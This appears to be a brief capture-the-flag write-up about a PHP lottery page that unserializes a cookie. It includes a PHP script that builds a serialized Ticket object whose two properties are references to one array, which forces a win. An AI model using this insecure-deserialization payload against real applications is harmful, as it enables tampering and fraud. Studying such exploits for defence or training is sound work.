- `$win = true` when `$ticket->result` and `$ticket->number` are equal. Initially , their values are controlled by user via cookies and the website lacks a mechanism to verify cookie's origin.But values `$ticket->result` is overwritten by the BE.
```

    for ($i = 0; $i < 6; $i++) {
        if ($ticket->results[$i] !== $ticket->numbers[$i]){
            $win = false;
        }
    }
```
- To bypass this, we need to utilize the concept of references in PHP. This ensures that when the backend overwrites `$ticket->result`, the value of `$ticket->number` is automatically updated with the same value . [doc](https://www.tutorialspoint.com/article/php-references)
- payload create cookies
```
<?php

class Ticket{
    public $results;
    public $numbers;
}

$t = new Ticket();

$arr = [];


$t->results =& $arr;
$t->numbers =& $arr;

echo serialize($t)
```
